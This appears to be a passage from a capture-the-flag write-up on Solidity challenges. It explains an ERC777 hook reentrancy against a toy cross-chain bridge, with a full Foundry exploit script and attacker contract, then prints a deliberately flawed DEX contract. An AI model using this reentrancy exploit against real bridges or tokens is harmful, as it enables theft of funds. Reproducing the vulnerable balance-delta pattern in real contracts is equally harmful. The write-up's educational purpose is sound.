</span></code></pre></div></div><h2 id=solution-6><a aria-label="Anchor link for: solution-6" class=zola-anchor href=#solution-6>Solution</a></h2><p>Yes man, bridges.. More interesting and I personally I love bridges. Let's do this as quick as possible.<p>Lets, break down the Bridge protocol.<ol><li><p><strong>Bridge (Main Contract)</strong></p> <ul><li>Handles cross-chain messaging and token transfers<li>Manages remote bridge registrations and token registrations<li>Key functions: <ul><li><code>ethOut/ethIn</code>: Handles ETH transfers between chains<li><code>ERC20Out/ERC20In</code>: Handles ERC20 token transfers<li><code>ERC20Register</code>: Registers new tokens on remote chains<li><code>sendRemoteMessage</code>: Core function for sending messages between chains</ul></ul><li><p><strong>BridgedERC20</strong></p> <ul><li>Special ERC20 token for cross-chain transfers<li>Can only be minted by remote bridge and burned by local bridge<li>Tracks the remote token address and bridge contracts<li>Implements strict access controls for minting/burning</ul><li><p><strong>Token</strong></p> <ul><li>Simple ERC777 token used in the challenge<li>Mints initial tokens to deployer and user</ul></ol><p>This is not a complete bridge protocol because there is no off-chain componets like relayers, etc. But all the things were replicated in the smart contract itself. Because of this it's confusing to understand which one is source contract and which one is destination contract.<p>Just follow me, <code>remoteBridge</code> means destination bridge, <code>ethOut()</code> or <code>ERC20Out()</code> means that the source contract is sending to destination contract. <code>ethIn()</code> or <code>ERC20In()</code> are the functions which usually called by off-chain components like relayer but here the source contract directly calls these functions on destination contract. Here <code>ethIn()</code> or <code>ERC20In()</code> are restricted to be only calleable by the remote bridge. <code>ERC20Register()</code> is to deploy a equivalent token (wrapped) on the destination for a token on source chain. Here, If the token was not registered the on the first bridging of that token the registration and the deployment of wrapped token will be done automatically. The wrapped token which is going to be deployed for a token on source chain is <code>BridgedERC20</code> token. Token we are going to bridge is <code>Token</code> an <code>ERC777</code>.<p>Usually asset moving bridges will follow following modes of bridging.<ul><li><strong>Lock</strong> asset on source chain then <strong>Mint</strong> a wrapped asset on destination<li><strong>Burn</strong> and <strong>Mint</strong><li><strong>Lock</strong> and <strong>Release</strong><li><strong>Burn</strong> and <strong>Mint</strong></ul><p>Here in this protocol the <strong>Lock</strong> and <strong>Mint</strong> in forward direction and when the same Wrapped token bridged back to source then the <strong>Burn</strong> and <strong>Release</strong> happens. (I'd love to explain all these in a dedicated blog post)<p><code>sendRemoteMessage()</code> function will log a message to be picked up by the off-chain relayer and send it to destination. But here all this relayer functionality was implemented in this function itself. It was restricted to be calling from by anyone else except the same contract functions with the following check. If this check was not there we could've simply call this to perform an attack. But no luck, we can't do this.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>require(msg.sender == address(this), "S");
</span></code></pre><p>But the <code>sendRemoteMessage()</code> function is called by the <code>ethOut()</code> or <code>ERC20Out()</code> and then the call goes to <code>ethIn()</code> or <code>ERC20In()</code>.<pre style=color:#61676c;background-color:#fafafa><code><span>USER -> ethOut()/ERC20Out()  -> sendRemoteMessage() -> ethIn()/ERC20In() -> USER (mint/release tokens)
</span></code></pre><p>Let's get the initial state of the protocol,<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#f29718>Bridge:</span><span>  0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba
</span><span style=color:#f29718>FLAG_TOKEN:</span><span>  0x7a072D0a5C338679Da17C4922C364c03167D1fB2 (ERC777)
</span><span style=color:#f29718>Player</span><span> balance of FLAG :  1000000000000000000
</span><span style=color:#f29718>SOURCE</span><span> Bridge balance of FLAG :  100000000000000000000
</span><span style=color:#f29718>SOURCE</span><span> CHAIN_ID :  1
</span><span style=color:#f29718>Total</span><span> Default operators of FLAG :  0
</span><span style=color:#f29718>REMOTE</span><span> CHAIN_ID :  2
</span><span style=color:#f29718>REMOTE</span><span> Bridge:  0xd73fFbbd87624b59e166717676F0e10135C9fe3B
</span><span style=color:#f29718>REMOTE</span><span> Bridge balance:  0
</span></code></pre><p>Expected initial data..<p>How can we bridge the <code>1e18</code> of ERC777 Token that we got? By calling <code>ERC20Out()</code><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function ERC20Out(address _token, address _to, uint256 _amount) external {
</span><span>        emit ERC20_transfer(_token, _to, _amount);
</span><span>        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
</span><span>        address _remoteBridge = remoteBridge[_remoteChainId];
</span><span>        if (isBridgedERC20[_token]) {
</span><span>            BridgedERC20(_token).burn(msg.sender, _amount);
</span><span>            _token = BridgedERC20(_token).REMOTE_TOKEN();
</span><span>        } else {
</span><span>            uint256 balance = IERC20(_token).balanceOf(address(this));
</span><span>            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
</span><span>            _amount = IERC20(_token).balanceOf(address(this)) - balance;
</span><span>            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
</span><span>                this.sendRemoteMessage(
</span><span>                    _remoteChainId,
</span><span>                    _remoteBridge,
</span><span>                    abi.encodeWithSelector(
</span><span>                        Bridge.ERC20Register.selector,
</span><span>                        _token,
</span><span>                        IERC20Metadata(_token).name(),
</span><span>                        IERC20Metadata(_token).symbol()
</span><span>                    )
</span><span>                );
</span><span>                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
</span><span>            }
</span><span>        }
</span><span>        this.sendRemoteMessage(
</span><span>            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
</span><span>        );
</span><span>    }
</span></code></pre><p>Observing the above function, if the token that we are sending is <code>BridgedERC20</code> then the burn happens. If not the lock happens. Nothing exciting in the if block. But in the else block the lock of our token happens (ERC777).<p>Can you see the problem of these three lines???<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>uint256 balance = IERC20(_token).balanceOf(address(this));
</span><span>require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
</span><span>_amount = IERC20(_token).balanceOf(address(this)) - balance;
</span></code></pre><p>I can see it.. The <code>balance</code> is fetched on line 1 then same balance is used after the <code>trnasferFrom()</code> call. What is anybody can <strong>reenter</strong> from that transferFrom call?? With standard ERC20 token transfers it's not possible. But it is possible from the <code>ERC777</code> transfers bacause of an extra feature called Hooks and Callbacks.<p><em>"Hooks in ERC777 tokens serve as entry points for custom code execution during token transfers. They allow external smart contracts to intervene in the token transfer process, either before or after the transfer occurs. This flexibility is a double-edged sword, as it can be used for legitimate purposes but also exploited for malicious actions."</em> - Johny<h3 id=erc777><a aria-label="Anchor link for: erc777" class=zola-anchor href=#erc777>ERC777</a></h3><p>The following are the functions of ERC777 standard. In the <code>transferFrom()</code> the contract will call the <code>_send()</code> hook, there in the hook if the sender is registered a <code>IERC777Sender</code> interface implementer in the <code>_ERC1820_REGISTRY</code> contract then the hook will call the <code>tokensToSend()</code> function on the implementor. Here the user is the sender but the implementor is someother contract registered by the user as his <code>IERC777Sender</code> implementor. Look at the following control flow for better understanding.<pre style=color:#61676c;background-color:#fafafa><code><span>User -> Deploys a contract -> Declares the contract as willing to be an implementer 
</span><span>User -> transferFrom() -> _send() -> _callTokensToSend() -> user Implementor.tokensToSend()
</span></code></pre><p>Okay, enough reconnaissance. Now we know the it is possible to reenter to back to the <code>ERC20Out()</code> function with callback hooks of <code>ERC777</code> via the <code>ERC-1820 registry</code>,<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>    function transferFrom(
</span><span>        address holder,
</span><span>        address recipient,
</span><span>        uint256 amount
</span><span>    ) public virtual override returns (bool) {
</span><span>        address spender = _msgSender();
</span><span>        _spendAllowance(holder, spender, amount);
</span><span>        _send(holder, recipient, amount, "", "", false);
</span><span>        return true;
</span><span>    }
</span><span>
</span><span>        function _send(
</span><span>        address from,
</span><span>        address to,
</span><span>        uint256 amount,
</span><span>        bytes memory userData,
</span><span>        bytes memory operatorData,
</span><span>        bool requireReceptionAck
</span><span>    ) internal virtual {
</span><span>        require(from != address(0), "ERC777: transfer from the zero address");
</span><span>        require(to != address(0), "ERC777: transfer to the zero address");
</span><span>
</span><span>        address operator = _msgSender();
</span><span>
</span><span>        _callTokensToSend(operator, from, to, amount, userData, operatorData);
</span><span>
</span><span>        _move(operator, from, to, amount, userData, operatorData);
</span><span>
</span><span>        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);
</span><span>    }
</span><span>
</span><span>    function _callTokensToSend(
</span><span>        address operator,
</span><span>        address from,
</span><span>        address to,
</span><span>        uint256 amount,
</span><span>        bytes memory userData,
</span><span>        bytes memory operatorData
</span><span>    ) private {
</span><span>        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);
</span><span>        if (implementer != address(0)) {
</span><span>            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);
</span><span>        }
</span><span>    }
</span></code></pre><h3 id=attack><a aria-label="Anchor link for: attack" class=zola-anchor href=#attack>Attack</a></h3><ul><li><p>Deploy an Attacker contract and register this attacker contract as the Implementer for the Player.</p><li><p>Send <code>0.5 ether</code> amount of ERC777 tokens to Attack</p><li><p>Inside <code>tokensToSend(operator, from, to, amount, userData, operatorData)</code> function of Attack contract, add the following logic</p> <ul><li>reenter to the <code>ERC20Out()</code> function by sending same <code>amount</code> again.</ul><li><p>Start the attack by calling <code>ERC20Out()</code> function with amount <code>0.5 ether</code>.</p><li><p>The following vulnerable lines of code will execute</p> <pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>    uint256 balance = IERC20(_token).balanceOf(address(this));  // 100 ether
</span><span>    require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T"); // Call to Attack.tokensToSend()
</span><span>    _amount = IERC20(_token).balanceOf(address(this)) - balance;
</span></code></pre><li><p>Attack contract wil reenter the function with amount <code>0.5 ether</code>, but the bridge balance is still 100 ether.</p><li><p>Second <code>tranferFrom</code> call from Attack will be succeeded and Attack contract will get <code>0.5 ether</code> of <code>BridgedERC20</code> tokens. Bridge also gets <code>0.5 ether</code> of ERC777 tokens.</p><li><p>First <code>transferFrom</code> call completes will get <code>0.5 ether</code> of <code>BridgedERC20</code> tokens. Bridge also gets <code>0.5 ether</code> of ERC777 tokens. Bridge balance is now <code>101 ether</code></p><li><p>Now on the third line <code> _amount = IERC20(_token).balanceOf(address(this)) - balance;</code></p> <ul><li><code>_amount = 101 ether - 100 ether = 1 ether</code></ul><li><p>Now the <code>1 ether</code> of <code>BridgedERC20</code> will be minted to Player.</p><li><p>If we bridge these tokens back, <code>BridgedERC20</code> will be burned and <code>ERC777</code>(FLAG) tokens will be sent to Player.</p><li><p>After one successfull iteration of these steps we got <code>0.5 ether</code> of more tokens than we have.</p></ul><p>Now do you own math and find a way to execute this logic until you got atleast <code>10 ether</code> of ERC777 tokens or FLAG tokens.<p>Don't look at my following exploit, I did a terrible math there.<div class=note-container><button class=note-toggle><div class=note-icon><p>Bridge.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: SEE LICENSE IN LICENSE
</span><span>pragma solidity ^0.8.20;
</span><span>import {Script} from "forge-std/Script.sol";
</span><span>import {console} from "forge-std/console.sol";
</span><span>import {Bridge, Token, BridgedERC20} from "../src/Bridge.sol";
</span><span>import {IERC20, IERC20Metadata} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/extensions/IERC20Metadata.sol";
</span><span>import {IERC777Sender} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC777/IERC777Sender.sol";
</span><span>import {IERC1820Registry} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/IERC1820Registry.sol";
</span><span>
</span><span>import {ERC1820Implementer} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/ERC1820Implementer.sol";
</span><span>contract BridgeSolve is Script {
</span><span>    Bridge public bridge = Bridge(payable(0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba));
</span><span>    Bridge public remoteBridge;
</span><span>    Token public flagToken;
</span><span>    
</span><span>    address public relayer;
</span><span>    address public player;
</span><span>    uint256 public CHAIN_ID = 1;
</span><span>    uint256 public REMOTE_CHAIN_ID = 2;
</span><span>    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
</span><span>    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
</span><span>
</span><span>    function run() public {
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        player = vm.envAddress("PLAYER");
</span><span>        console.log("Player : ", player);
</span><span>        console.log("Player balance: ", player.balance);
</span><span>        console.log("Bridge: ", address(bridge));
</span><span>        // console.log("Bridge balance: ", address(bridge).balance);
</span><span>        flagToken = Token(bridge.FLAG_TOKEN());
</span><span>        // relayer = bridge.relayer();
</span><span>        console.log("FLAG_TOKEN: ", address(flagToken));
</span><span>        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
</span><span>        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
</span><span>        console.log("SOURCE CHAIN_ID : ", CHAIN_ID);
</span><span>        // console.log("isSolved(): ", bridge.isSolved());
</span><span>        console.log("Total Default operators of FLAG : ", flagToken.defaultOperators().length); // NO operators
</span><span>        // console.log("Relayer: ", relayer);
</span><span>        remoteBridge = Bridge(payable(bridge.remoteBridge(REMOTE_CHAIN_ID)));
</span><span>        console.log("REMOTE CHAIN_ID : ", REMOTE_CHAIN_ID);
</span><span>        console.log("REMOTE Bridge: ", address(remoteBridge));
</span><span>        console.log("REMOTE Bridge balance: ", address(remoteBridge).balance);
</span><span>        Attack attack = new Attack(address(bridge), /*address(bridgedToken)*/ address(flagToken), player);
</span><span>        console.log("Attack : ", address(attack));
</span><span>       _ERC1820_REGISTRY.setInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH, address(attack));
</span><span>        require(attack.isRegister()==address(attack), "Failed to set interface");
</span><span>        flagToken.approve(address(bridge), type(uint256).max);
</span><span>        address bridgedToken;
</span><span>        while (flagToken.balanceOf(address(bridge)) > 89 ether) {
</span><span>        // for (uint8 i; i <=1; i++){
</span><span>            uint256 amount = flagToken.balanceOf(address(player))/2;
</span><span>            flagToken.transfer(address(attack), amount);
</span><span>            bridge.ERC20Out(address(flagToken), player, amount);
</span><span>            bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
</span><span>            attack.sendMeback();
</span><span>            remoteBridge.ERC20Out(bridgedToken, player, BridgedERC20(bridgedToken).balanceOf(player));
</span><span>        }
</span><span>        bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
</span><span>        console.log("REMOTE Bridge balance of FLAG : ", flagToken.balanceOf(address(remoteBridge)));
</span><span>        // console.log("IS FLAG token registed at remote : ", bridge.isTokenRegisteredAtRemote(REMOTE_CHAIN_ID, address(flagToken)));
</span><span>        // console.log("FLAG token to local token(BridgedERC20) : ", bridgedToken);
</span><span>        console.log("Player balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(player));
</span><span>        // console.log("Attack balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(address(attack)));
</span><span>        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
</span><span>        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
</span><span>        console.log("Attack balance of FLAG : ", flagToken.balanceOf(address(attack)));
</span><span>        console.log("isSolved(): ", bridge.isSolved());
</span><span>        vm.stopBroadcast();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack is ERC1820Implementer, IERC777Sender {
</span><span>    // BridgedERC20 public bridgedERC20;
</span><span>    Bridge public bridge;
</span><span>    address public flagToken;
</span><span>    address public player;
</span><span>    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
</span><span>    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
</span><span>
</span><span>    constructor(address _bridge, /*address _bridgedERC20,*/ address _flagToken, address _player) {
</span><span>        bridge = Bridge(payable(_bridge));
</span><span>        // bridgedERC20 = BridgedERC20(_bridgedERC20);
</span><span>        flagToken = _flagToken;
</span><span>        player = _player;
</span><span>        _registerInterfaceForAddress(_TOKENS_SENDER_INTERFACE_HASH, player);
</span><span>        IERC20(flagToken).approve(address(bridge), type(uint256).max);
</span><span>    }
</span><span>    function isRegister() public returns (address implementer){
</span><span>        implementer = _ERC1820_REGISTRY.getInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH);
</span><span>    }
</span><span>    function sendMeback() external {
</span><span>        IERC20(flagToken).transfer(player, IERC20(flagToken).balanceOf(address(this)));
</span><span>    }
</span><span>    function tokensToSend(
</span><span>        address operator,
</span><span>        address from,
</span><span>        address to,
</span><span>        uint256 amount,
</span><span>        bytes calldata userData,
</span><span>        bytes calldata operatorData
</span><span>    ) external {
</span><span>        if ((from == player && to == address(this)) || (from == address(bridge) && to == player)){
</span><span>            return;
</span><span>        }
</span><span>        bridge.ERC20Out(address(flagToken), player, amount);
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=exchange><a aria-label="Anchor link for: exchange" class=zola-anchor href=#exchange>Exchange</a></h1><p>P: "You heard there is a new Dex primitive that has launched on-chain with a lot of tokens. As a whitehat hacker, you race to find any bugs before the blackhats do. Can you rescue the tokens from the contract?"<div class=note-container><button class=note-toggle><div class=note-icon><p>Exchange.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: UNLICENSED
</span><span>pragma solidity ^0.8.24;
</span><span>
</span><span>interface SwapCallback {
</span><span>    function doSwap() external;
</span><span>}
</span><span>
</span><span>contract Setup {
</span><span>    Exchange public immutable exchange = new Exchange();
</span><span>
</span><span>    uint256 balance1 = 300_000;
</span><span>    uint256 balance2 = 300_000;
</span><span>    uint256 balance3 = 600_000;
</span><span>
</span><span>    Token public token1 = new Token(balance1);
</span><span>    Token public token2 = new Token(balance2);
</span><span>    Token public token3 = new Token(balance3);
</span><span>
</span><span>    constructor() {
</span><span>        exchange.addToken(address(token1));
</span><span>        exchange.addToken(address(token2));
</span><span>        exchange.addToken(address(token3));
</span><span>
</span><span>        token1.approve(address(exchange), balance1);
</span><span>        token2.approve(address(exchange), balance2);
</span><span>        token3.approve(address(exchange), balance3);
</span><span>
</span><span>        exchange.addLiquidity(address(token1), address(token2), balance1 / 3, balance2 / 3);
</span><span>
</span><span>        exchange.addLiquidity(address(token1), address(token3), balance1 / 3, balance3 / 3);
</span><span>
</span><span>        exchange.addLiquidity(address(token2), address(token3), balance2 / 3, balance3 / 3);
</span><span>    }
</span><span>
</span><span>    function isSolved() public view returns (bool) {
</span><span>        return (
</span><span>            Token(token1).balanceOf(address(exchange)) == 0 && Token(token2).balanceOf(address(exchange)) == 0
</span><span>                && Token(token3).balanceOf(address(exchange)) == 0
</span><span>        );
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Exchange {
</span><span>    struct Pool {
</span><span>        uint256 leftReserves;
</span><span>        uint256 rightReserves;
</span><span>    }
</span><span>
</span><span>    struct SavedBalance {
</span><span>        bool initiated;
</span><span>        uint256 balance;
</span><span>    }
</span><span>
</span><span>    struct SwapState {
</span><span>        bool hasBegun;
</span><span>        uint256 unsettledTokens;
</span><span>        mapping(address => int256) positions;
</span><span>        mapping(address => SavedBalance) savedBalances;
</span><span>    }
</span><span>
</span><span>    address public admin;
</span><span>    uint256 nonce = 0;
</span><span>    mapping(address => bool) public allowedTokens;
</span><span>    mapping(uint256 => SwapState) private swapStates;
</span><span>    mapping(address => mapping(address => Pool)) private pools;
</span><span>
</span><span>    constructor() {
</span><span>        admin = msg.sender;
</span><span>    }
</span><span>
</span><span>    function addToken(address token) public {
</span><span>        require(msg.sender == admin, "not admin");
</span><span>        allowedTokens[token] = true;
</span><span>    }
</span><span>
</span><span>    modifier duringSwap() {
</span><span>        require(swapStates[nonce].hasBegun, "swap not in progress");
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    function getSwapState() internal view returns (SwapState storage) {
</span><span>        return swapStates[nonce];
</span><span>    }
</span><span>
</span><span>    function getPool(address tokenA, address tokenB)
</span><span>        internal
</span><span>        view
</span><span>        returns (address left, address right, Pool storage pool)
</span><span>    {
</span><span>        require(tokenA != tokenB);
</span><span>
</span><span>        if (tokenA < tokenB) {
</span><span>            left = tokenA;
</span><span>            right = tokenB;
</span><span>        } else {
</span><span>            left = tokenB;
</span><span>            right = tokenA;
</span><span>        }
</span><span>
</span><span>        pool = pools[left][right];
</span><span>    }
</span><span>
</span><span>    function getReserves(address token, address other) public view returns (uint256) {
</span><span>        (address left,, Pool storage pool) = getPool(token, other);
</span><span>        return token == left ? pool.leftReserves : pool.rightReserves;
</span><span>    }
</span><span>
</span><span>    function setReserves(address token, address other, uint256 amount) internal {
</span><span>        (address left,, Pool storage pool) = getPool(token, other);
</span><span>
</span><span>        if (token == left) pool.leftReserves = amount;
</span><span>        else pool.rightReserves = amount;
</span><span>    }
</span><span>
</span><span>    function getLiquidity(address left, address right) public view returns (uint256) {
</span><span>        (,, Pool storage pool) = getPool(left, right);
</span><span>        return pool.leftReserves * pool.rightReserves;
</span><span>    }
</span><span>
</span><span>    function addLiquidity(address left, address right, uint256 amountLeft, uint256 amountRight) public {
</span><span>        require(allowedTokens[left], "token not allowed");
</span><span>        require(allowedTokens[right], "token not allowed");
</span><span>
</span><span>        Token(left).transferFrom(msg.sender, address(this), amountLeft);
</span><span>        Token(right).transferFrom(msg.sender, address(this), amountRight);
</span><span>
</span><span>        setReserves(left, right, getReserves(left, right) + amountLeft);
</span><span>        setReserves(right, left, getReserves(right, left) + amountRight);
</span><span>    }
</span><span>
</span><span>    function swap() external {
</span><span>        SwapState storage swapState = getSwapState();
</span><span>
</span><span>        require(!swapState.hasBegun, "swap already in progress");
</span><span>        swapState.hasBegun = true;
</span><span>
</span><span>        SwapCallback(msg.sender).doSwap();
</span><span>
</span><span>        require(swapState.unsettledTokens == 0, "not settled");
</span><span>        nonce += 1;
</span><span>    }
</span><span>
</span><span>    function updatePosition(address token, int256 amount) internal {
</span><span>        require(allowedTokens[token], "token not allowed");
</span><span>
</span><span>        SwapState storage swapState = getSwapState();
</span><span>
</span><span>        int256 currentPosition = swapState.positions[token];
</span><span>        int256 newPosition = currentPosition + amount;
</span><span>
</span><span>        if (newPosition == 0) swapState.unsettledTokens -= 1;
</span><span>        else if (currentPosition == 0) swapState.unsettledTokens += 1;
</span><span>
</span><span>        swapState.positions[token] = newPosition;
</span><span>    }
</span><span>
</span><span>    function withdraw(address token, uint256 amount) public duringSwap {
</span><span>        require(allowedTokens[token], "token not allowed");
</span><span>
</span><span>        Token(token).transfer(msg.sender, amount);
</span><span>        updatePosition(token, -int256(amount));
</span><span>    }
</span><span>
</span><span>    function initiateTransfer(address token) public duringSwap {
</span><span>        require(allowedTokens[token], "token not allowed");
</span><span>
</span><span>        SwapState storage swapState = getSwapState();
</span><span>        SavedBalance storage state = swapState.savedBalances[token];
</span><span>
</span><span>        require(!state.initiated, "transfer already initiated");
</span><span>
</span><span>        state.initiated = true;
</span><span>        state.balance = Token(token).balanceOf(address(this));
</span><span>    }
</span><span>
</span><span>    function finalizeTransfer(address token) public duringSwap {
</span><span>        require(allowedTokens[token], "token not allowed");
</span><span>
</span><span>        SwapState storage swapState = getSwapState();
</span><span>        SavedBalance storage state = swapState.savedBalances[token];
</span><span>
</span><span>        require(state.initiated, "transfer not initiated");
</span><span>
</span><span>        uint256 balance = Token(token).balanceOf(address(this));
</span><span>        uint256 amount = balance - state.balance;
</span><span>
</span><span>        state.initiated = false;
</span><span>        updatePosition(token, int256(amount));
</span><span>    }
</span><span>
</span><span>    function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
</span><span>        require(allowedTokens[tokenIn], "token not allowed");
</span><span>        require(allowedTokens[tokenOut], "token not allowed");
</span><span>
</span><span>        uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);
</span><span>
</span><span>        require(liquidityBefore > 0, "no liquidity");
</span><span>
</span><span>        uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
</span><span>        uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;
</span><span>
</span><span>        setReserves(tokenIn, tokenOut, newReservesIn);
</span><span>        setReserves(tokenOut, tokenIn, newReservesOut);
</span><span>
</span><span>        uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);
</span><span>
</span><span>        updatePosition(tokenIn, -int256(amountIn));
</span><span>        updatePosition(tokenOut, int256(amountOut));
</span><span>
</span><span>        require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Token {
</span><span>    uint256 public totalSupply;
</span><span>    mapping(address => uint256) balances;
</span><span>    mapping(address => mapping(address => uint256)) allowed;
</span><span>
</span><span>    constructor(uint256 _initialAmount) {
</span><span>        balances[msg.sender] = _initialAmount;
</span><span>        totalSupply = _initialAmount;
</span><span>    }
</span><span>
</span><span>    function balanceOf(address _owner) public view returns (uint256) {
</span><span>        return balances[_owner];
</span><span>    }
</span><span>
</span><span>    function transfer(address _to, uint256 _value) public returns (bool) {
</span><span>        require(balances[msg.sender] >= _value);
</span><span>        balances[msg.sender] -= _value;
</span><span>        balances[_to] += _value;
</span><span>        return true;
</span><span>    }
</span><span>
</span><span>    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
</span><span>        require(allowed[_from][msg.sender] >= _value);
</span><span>        require(balances[_from] >= _value);
</span><span>        balances[_to] += _value;
</span><span>        balances[_from] -= _value;
</span><span>        allowed[_from][msg.sender] -= _value;
</span><span>        return true;
</span><span>    }
</span><span>
</span><span>    function approve(address _spender, uint256 _value) public returns (bool) {
</span><span>        allowed[msg.sender][_spender] = _value;
</span><span>        return true;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-7><a aria-label="Anchor link for: solution-7" class=zola-anchor href=#solution-7>Solution</a></h2><p>What does this protocol is doing? Let's break it down<ol><li><p><strong>Setup Contract</strong></p> <ul><li>Initializes the exchange with initial liquidity<li>Creates three tokens (token1, token2, token3) with balances: <ul><li>token1: 300,000 tokens<li>token2: 300,000 tokens<li>token3: 600,000 tokens</ul><li>Adds initial liquidity pairs: <ul><li>token1/token2: 100,000 each<li>token1/token3: 100,000/200,000<li>token2/token3: 100,000/200,000</ul></ul><li><p><strong>Exchange Contract</strong></p> <ul><li>Core DEX functionality with unique swap mechanism<li>Key components: <ul><li><code>Pool</code>: Tracks reserves for token pairs<li><code>SwapState</code>: Manages ongoing swap states and positions<li><code>SavedBalance</code>: Tracks balance snapshots during swaps</ul><li>Main functions: <ul><li><code>addLiquidity()</code>: Add tokens to pools<li><code>swap()</code>: Initiates a swap transaction<li><code>swapTokens()</code>: Performs the actual token swap<li><code>withdraw()</code>: Withdraws tokens during a swap<li><code>initiateTransfer/finalizeTransfer</code>: Two-step transfer process</ul></ul></ol><p>As usual what's the initial state of the protocol??<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#f29718>Player</span><span> :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
</span><span style=color:#f29718>Setup</span><span> :  0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B
</span><span style=color:#f29718>Exchange</span><span> :  0xb3CE3E482D1caf5b444f3f6b95a9d8799f6dac11
</span><span style=color:#f29718>Token1</span><span> :  0xa95A2a693880626911bb521CB50b7DC7Caa0EC05
</span><span style=color:#f29718>Token2</span><span> :  0x601C3EA942c5Eae7301C39c95342307a17cEc0B7
</span><span style=color:#f29718>Token3</span><span> :  0xd5e4b9f37E1b51D18CD2f281B85DCDC07b4540a1
</span><span style=color:#f29718>isSolved</span><span>() :  false
</span><span>Exchange balance Token1 :  200000
</span><span>Exchange balance Token2 :  200000
</span><span>Exchange balance Token3 :  400000
</span><span>Player balance Token1 :  0
</span><span>Player balance Token2 :  0
</span><span>Player balance Token3 :  0
</span></code></pre><p>Okay, Goal is to drain all tokens from the exchange. Lets do this.<p>We need to find the function where the token amount is being sent to us. It is the <code>withdraw()</code> function.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function withdraw(address token, uint256 amount) public duringSwap {
</span><span>    require(allowedTokens[token], "token not allowed");
</span><span>
</span><span>    Token(token).transfer(msg.sender, amount);
</span><span>    updatePosition(token, -int256(amount));
</span><span>}
</span></code></pre><p>The withdraw function is optimistically sending the amount we are requesting directly to the caller and then updating the position, but first of all the swap should begin (<code>duringSwap</code>). For this we can call <code>swap()</code> functions to start the swap.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function swap() external {
</span><span>    SwapState storage swapState = getSwapState();
</span><span>
</span><span>    require(!swapState.hasBegun, "swap already in progress");
</span><span>    swapState.hasBegun = true;
</span><span>
</span><span>    SwapCallback(msg.sender).doSwap();
</span><span>
</span><span>    require(swapState.unsettledTokens == 0, "not settled");
</span><span>    nonce += 1;
</span><span>}
